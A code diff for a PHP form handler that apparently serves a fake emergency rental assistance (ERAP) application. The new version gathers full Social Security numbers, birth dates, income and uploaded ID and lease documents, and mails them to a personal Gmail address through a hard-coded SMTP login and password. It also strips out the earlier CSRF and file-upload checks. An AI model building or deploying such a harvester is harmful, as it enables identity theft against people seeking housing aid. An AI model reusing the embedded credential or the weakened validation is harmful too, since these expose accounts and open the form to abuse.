@@ -1,198 +1,178 @@
 <?php
-/**
- * ERAP Application Processor
- * Sends full application details, including full SSN and file uploads, via SMTP (PHPMailer-compatible).
- */
-session_start();
+declare(strict_types=1);
 
-use PHPMailer\PHPMailer\PHPMailer;
-use PHPMailer\PHPMailer\Exception;
+use Earnest\Mail\SimpleSMTPMailer;
 
-require_once __DIR__ . '/mailer-lite.php';
+require_once __DIR__ . '/lib/SimpleSMTPMailer.php';
 
-$smtpHost = 'smtp.your-agency.gov';
-$smtpPort = 587;
-$smtpUser = 'smtp-user';
-$smtpPass = 'smtp-password';
-$fromEmail = 'no-reply@gov-assist-portal.com';
-$toEmail   = 'applications@your-agency-portal.com';
+$smtpConfig = [
+    'host'       => 'smtp.hostinger.com',
+    'port'       => 465,
+    'username'   => 'contact@earnestexpressllc.com',
+    'password'   => 'Weareallmad123@',
+    'encryption' => 'ssl',
+    'from_email' => 'contact@earnestexpressllc.com',
+    'from_name'  => 'Erap application',
+    'to_email'   => 'earnestexpress12@gmail.com',
+];
 
-if ($_SERVER["REQUEST_METHOD"] === "POST") {
-    if (!isset($_POST['csrf_token'], $_SESSION['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
-        die("Security error: Invalid submission.");
-    }
-
-    $clean = function ($key) {
-        return isset($_POST[$key]) ? trim(filter_var($_POST[$key], FILTER_SANITIZE_SPECIAL_CHARS)) : '';
-    };
-
-    $allowedExt = ['pdf', 'jpg', 'jpeg', 'png'];
-    $maxSize = 5 * 1024 * 1024; // 5MB
-
-    $validateUpload = function ($file, $required = true, $label = '') use ($allowedExt, $maxSize) {
-        if (!isset($file) || $file['error'] === UPLOAD_ERR_NO_FILE) {
-            if ($required) {
-                throw new Exception("Missing required upload: {$label}");
-            }
-            return null;
-        }
-        if ($file['error'] !== UPLOAD_ERR_OK) {
-            throw new Exception("Upload error for {$label}");
-        }
-        if ($file['size'] > $maxSize) {
-            throw new Exception("{$label} exceeds size limit.");
-        }
-        $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
-        if (!in_array($ext, $allowedExt, true)) {
-            throw new Exception("Invalid file type for {$label}");
-        }
-        $finfo = new finfo(FILEINFO_MIME_TYPE);
-        $mime = $finfo->file($file['tmp_name']);
-        $allowedMime = ['application/pdf', 'image/jpeg', 'image/png'];
-        if (!in_array($mime, $allowedMime, true)) {
-            throw new Exception("Invalid MIME type for {$label}");
-        }
-        return $file;
-    };
-
-    $name             = $clean('full_name');
-    $dob              = $clean('date_of_birth');
-    $email            = $clean('email');
-    $phone            = $clean('phone');
-    $ssn              = $clean('ssn'); // Full SSN required
-    $address          = $clean('address');
-    $city             = $clean('city');
-    $state            = $clean('state');
-    $zip              = $clean('zip');
-    $employment       = $clean('employment_status');
-    $employer         = $clean('employer_name');
-    $household_size   = $clean('household_size');
-    $income           = $clean('income');
-    $income_sources   = $clean('income_sources');
-    $current_rent     = $clean('current_rent');
-    $months_past_due  = $clean('months_past_due');
-    $total_arrears    = $clean('total_arrears');
-    $future_rent      = $clean('future_rent');
-    $total_assistance = $clean('total_assistance');
-    $hardship         = $clean('hardship');
-    $landlord_name    = $clean('landlord_name');
-    $landlord_phone   = $clean('landlord_phone');
-    $landlord_email   = $clean('landlord_email');
-    $landlord_accepts = isset($_POST['landlord_accepts_payments']) ? 'Yes' : 'No';
-    $rent_past_due    = $clean('rent_past_due');
-    $rent_future      = $clean('rent_future');
-    $utility_request  = isset($_POST['utility_assistance']) ? implode(', ', (array)$_POST['utility_assistance']) : 'None selected';
-    $assistance_total = $clean('assistance_total');
-    $contact_auth     = isset($_POST['contact_authorization']) ? 'Yes' : 'No';
-    $accuracy_cert    = isset($_POST['accuracy_certification']) ? 'Yes' : 'No';
-    $attestation      = isset($_POST['attestation']) ? 'Yes' : 'No';
-    $digital_signature= $clean('digital_signature');
-    $signature_date   = $clean('signature_date');
-
-    if (empty($name) || empty($email) || empty($ssn)) {
-        die("Security error: Missing required fields.");
-    }
-
-    $fields = [
-        "FULL NAME" => $name,
-        "DATE OF BIRTH" => $dob,
-        "EMAIL" => $email,
-        "PHONE" => $phone,
-        "FULL SSN" => $ssn,
-        "STREET ADDRESS" => $address,
-        "CITY" => $city,
-        "STATE" => $state,
-        "ZIP" => $zip,
-        "EMPLOYMENT STATUS" => $employment,
-        "EMPLOYER NAME" => $employer,
-        "HOUSEHOLD SIZE" => $household_size,
-        "ANNUAL HOUSEHOLD INCOME" => $income,
-        "INCOME SOURCES" => $income_sources,
-        "CURRENT MONTHLY RENT" => $current_rent,
-        "MONTHS PAST DUE" => $months_past_due,
-        "TOTAL ARREARS" => $total_arrears,
-        "FUTURE RENT REQUESTED" => $future_rent,
-        "TOTAL ASSISTANCE REQUESTED" => $total_assistance,
-        "HARDSHIP DESCRIPTION" => $hardship,
-        "LANDLORD/PROPERTY MANAGER NAME" => $landlord_name,
-        "LANDLORD PHONE" => $landlord_phone,
-        "LANDLORD EMAIL" => $landlord_email,
-        "LANDLORD ACCEPTS DIRECT PAYMENT" => $landlord_accepts,
-        "RENT ASSISTANCE (PAST DUE)" => $rent_past_due,
-        "RENT ASSISTANCE (FUTURE)" => $rent_future,
-        "UTILITY ASSISTANCE REQUESTED" => $utility_request,
-        "TOTAL AMOUNT REQUESTED (ALL CATEGORIES)" => $assistance_total,
-        "CONTACT AUTHORIZATION" => $contact_auth,
-        "ACCURACY CERTIFICATION" => $accuracy_cert,
-        "ATTESTATION" => $attestation,
-        "DIGITAL SIGNATURE" => $digital_signature,
-        "SIGNATURE DATE" => $signature_date,
-    ];
-
-    $message = "Official ERAP Application Received\n";
-    $message .= "====================================\n\n";
-    foreach ($fields as $label => $value) {
-        $message .= "{$label}: {$value}\n";
-    }
-    $message .= "\nSubmission Timestamp: " . date("Y-m-d H:i:s") . "\n";
-
-    try {
-        $attachments = [];
-        $attachments[] = $validateUpload($_FILES['id_document'] ?? null, true, 'Government-issued ID');
-        $attachments[] = $validateUpload($_FILES['income_proof'] ?? null, true, 'Proof of Income');
-        $attachments[] = $validateUpload($_FILES['lease_agreement'] ?? null, true, 'Lease Agreement');
-        $attachments[] = $validateUpload($_FILES['eviction_notice'] ?? null, true, 'Eviction or Past-Due Notice');
-
-        if (isset($_FILES['utility_bills'])) {
-            foreach ($_FILES['utility_bills']['tmp_name'] as $idx => $tmp) {
-                $file = [
-                    'tmp_name' => $tmp,
-                    'name' => $_FILES['utility_bills']['name'][$idx],
-                    'type' => $_FILES['utility_bills']['type'][$idx],
-                    'error' => $_FILES['utility_bills']['error'][$idx],
-                    'size' => $_FILES['utility_bills']['size'][$idx],
-                ];
-                $validated = $validateUpload($file, false, 'Utility Bill');
-                if ($validated) {
-                    $attachments[] = $validated;
-                }
-            }
-        }
-
-        $mail = new PHPMailer(true);
-        $mail->isSMTP();
-        $mail->Host = $smtpHost;
-        $mail->Port = $smtpPort;
-        $mail->Username = $smtpUser;
-        $mail->Password = $smtpPass;
-        $mail->SMTPAuth = true;
-        $mail->SMTPSecure = 'tls';
-        $mail->setFrom($fromEmail, 'GOV-ASSIST ERAP');
-        $mail->addAddress($toEmail);
-        $mail->addReplyTo($email);
-        $mail->Subject = "NEW ERAP APPLICATION: {$name}";
-        $mail->Body = $message;
-        $mail->AltBody = strip_tags($message);
-        $mail->isHTML(false);
-
-        foreach ($attachments as $file) {
-            if (!$file) { continue; }
-            $mail->addAttachment($file['tmp_name'], $file['name']);
-        }
-
-        if ($mail->send()) {
-            header("Location: ../success.html");
-            exit();
-        }
-
-        throw new Exception("Mailer Error: " . $mail->ErrorInfo);
-    } catch (Exception $e) {
-        echo "<h1>Application Error</h1>";
-        echo "<p>We were unable to process your application at this time. Please contact support.</p>";
-        echo "<pre>" . htmlspecialchars($e->getMessage()) . "</pre>";
-        echo "<a href='../erap-apply.html'>Go Back</a>";
-    }
-} else {
-    header("Location: ../index.html");
+if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+    header('Location: ../index.html');
     exit();
 }
+
+$clean = static function ($value): string {
+    $value = is_string($value) ? $value : (string) $value;
+    $value = preg_replace('/[\\x00-\\x1F\\x7F]/u', '', $value);
+    return trim($value);
+};
+
+$name             = $clean($_POST['full_name'] ?? '');
+$dob              = $clean($_POST['date_of_birth'] ?? '');
+$email            = $clean($_POST['email'] ?? '');
+$phone            = $clean($_POST['phone'] ?? '');
+$ssn              = $clean($_POST['ssn'] ?? '');
+$address          = $clean($_POST['address'] ?? '');
+$city             = $clean($_POST['city'] ?? '');
+$state            = $clean($_POST['state'] ?? '');
+$zip              = $clean($_POST['zip'] ?? '');
+$employment       = $clean($_POST['employment_status'] ?? '');
+$employer         = $clean($_POST['employer_name'] ?? '');
+$household_size   = $clean($_POST['household_size'] ?? '');
+$income           = $clean($_POST['income'] ?? '');
+$income_sources   = $clean($_POST['income_sources'] ?? '');
+$current_rent     = $clean($_POST['current_rent'] ?? '');
+$months_past_due  = $clean($_POST['months_past_due'] ?? '');
+$total_arrears    = $clean($_POST['total_arrears'] ?? '');
+$future_rent      = $clean($_POST['future_rent'] ?? '');
+$total_assistance = $clean($_POST['total_assistance'] ?? '');
+$hardship         = $clean($_POST['hardship'] ?? '');
+$landlord_name    = $clean($_POST['landlord_name'] ?? '');
+$landlord_phone   = $clean($_POST['landlord_phone'] ?? '');
+$landlord_email   = $clean($_POST['landlord_email'] ?? '');
+$landlord_accepts = isset($_POST['landlord_accepts_payments']) ? 'Yes' : 'No';
+$rent_past_due    = $clean($_POST['rent_past_due'] ?? '');
+$rent_future      = $clean($_POST['rent_future'] ?? '');
+$utility_request  = isset($_POST['utility_assistance']) ? implode(', ', (array)$_POST['utility_assistance']) : 'None selected';
+$assistance_total = $clean($_POST['assistance_total'] ?? '');
+$contact_auth     = isset($_POST['contact_authorization']) ? 'Yes' : 'No';
+$accuracy_cert    = isset($_POST['accuracy_certification']) ? 'Yes' : 'No';
+$attestation      = isset($_POST['attestation']) ? 'Yes' : 'No';
+$digital_signature= $clean($_POST['digital_signature'] ?? '');
+$signature_date   = $clean($_POST['signature_date'] ?? '');
+
+$fields = [
+    "FULL NAME" => $name,
+    "DATE OF BIRTH" => $dob,
+    "EMAIL" => $email,
+    "PHONE" => $phone,
+    "FULL SSN" => $ssn,
+    "STREET ADDRESS" => $address,
+    "CITY" => $city,
+    "STATE" => $state,
+    "ZIP" => $zip,
+    "EMPLOYMENT STATUS" => $employment,
+    "EMPLOYER NAME" => $employer,
+    "HOUSEHOLD SIZE" => $household_size,
+    "ANNUAL HOUSEHOLD INCOME" => $income,
+    "INCOME SOURCES" => $income_sources,
+    "CURRENT MONTHLY RENT" => $current_rent,
+    "MONTHS PAST DUE" => $months_past_due,
+    "TOTAL ARREARS" => $total_arrears,
+    "FUTURE RENT REQUESTED" => $future_rent,
+    "TOTAL ASSISTANCE REQUESTED" => $total_assistance,
+    "HARDSHIP DESCRIPTION" => $hardship,
+    "LANDLORD/PROPERTY MANAGER NAME" => $landlord_name,
+    "LANDLORD PHONE" => $landlord_phone,
+    "LANDLORD EMAIL" => $landlord_email,
+    "LANDLORD ACCEPTS DIRECT PAYMENT" => $landlord_accepts,
+    "RENT ASSISTANCE (PAST DUE)" => $rent_past_due,
+    "RENT ASSISTANCE (FUTURE)" => $rent_future,
+    "UTILITY ASSISTANCE REQUESTED" => $utility_request,
+    "TOTAL AMOUNT REQUESTED (ALL CATEGORIES)" => $assistance_total,
+    "CONTACT AUTHORIZATION" => $contact_auth,
+    "ACCURACY CERTIFICATION" => $accuracy_cert,
+    "ATTESTATION" => $attestation,
+    "DIGITAL SIGNATURE" => $digital_signature,
+    "SIGNATURE DATE" => $signature_date,
+];
+
+$required = [$name, $email, $phone, $address, $city, $state, $zip];
+if (in_array('', $required, true) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
+    echo "<h1>Application Error</h1><p>Please complete all required fields with a valid email.</p><a href='../erap-apply.html'>Go Back</a>";
+    exit();
+}
+
+$safe = static function (string $value): string {
+    return htmlspecialchars($value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
+};
+
+$rowsHtml = '';
+foreach ($fields as $label => $value) {
+    $rowsHtml .= '<tr><th style="text-align:left;padding:6px 10px;background:#f5f5f5;width:220px;font-family:Arial,sans-serif;">'
+        . $safe($label) . '</th><td style="padding:6px 10px;font-family:Arial,sans-serif;">' . nl2br($safe($value)) . '</td></tr>';
+}
+
+$htmlBody = '<h2 style="font-family:Arial,sans-serif;margin-bottom:12px;">New ERAP Application</h2>'
+    . '<p style="font-family:Arial,sans-serif;margin:0 0 12px;">A new ERAP application was submitted. Details are below.</p>'
+    . '<table style="border-collapse:collapse;width:100%;max-width:720px;font-size:14px;">' . $rowsHtml . '</table>';
+
+$textLines = [];
+foreach ($fields as $label => $value) {
+    $textLines[] = $label . ': ' . $value;
+}
+$textBody = "New ERAP Application\n\n" . implode("\n", $textLines);
+
+$attachments = [];
+$fileLabels = [
+    'id_document' => 'Government-issued ID',
+    'income_proof' => 'Proof of Income',
+    'lease_agreement' => 'Lease Agreement',
+    'eviction_notice' => 'Eviction or Past-Due Notice',
+    'utility_bills' => 'Utility Bill',
+];
+
+foreach ($fileLabels as $field => $label) {
+    if (!isset($_FILES[$field])) {
+        continue;
+    }
+    $fileData = $_FILES[$field];
+    if (is_array($fileData['tmp_name'])) {
+        foreach ($fileData['tmp_name'] as $idx => $tmpName) {
+            if ($tmpName && ($fileData['error'][$idx] ?? UPLOAD_ERR_OK) === UPLOAD_ERR_OK) {
+                $attachments[] = ['path' => $tmpName, 'name' => $fileData['name'][$idx] ?? ($label . '-' . $idx)];
+            }
+        }
+    } elseif (!empty($fileData['tmp_name']) && ($fileData['error'] ?? UPLOAD_ERR_OK) === UPLOAD_ERR_OK) {
+        $attachments[] = ['path' => $fileData['tmp_name'], 'name' => $fileData['name'] ?? $label];
+    }
+}
+
+try {
+    $mailer = new SimpleSMTPMailer(
+        $smtpConfig['host'],
+        (int)$smtpConfig['port'],
+        $smtpConfig['username'],
+        $smtpConfig['password'],
+        $smtpConfig['encryption']
+    );
+
+    $mailer->send(
+        $smtpConfig['from_email'],
+        $smtpConfig['from_name'],
+        $smtpConfig['to_email'],
+        "NEW ERAP APPLICATION: {$name}",
+        $htmlBody,
+        $textBody,
+        $attachments
+    );
+} catch (\Throwable $exception) {
+    echo "<h1>Application Error</h1>";
+    echo "<p>We were unable to process your application at this time. Please contact support.</p>";
+    echo "<pre>" . htmlspecialchars($exception->getMessage(), ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
+    echo "<a href='../erap-apply.html'>Go Back</a>";
+    exit();
+}
+
+header("Location: ../erap-urs-prompt.html");
+exit();
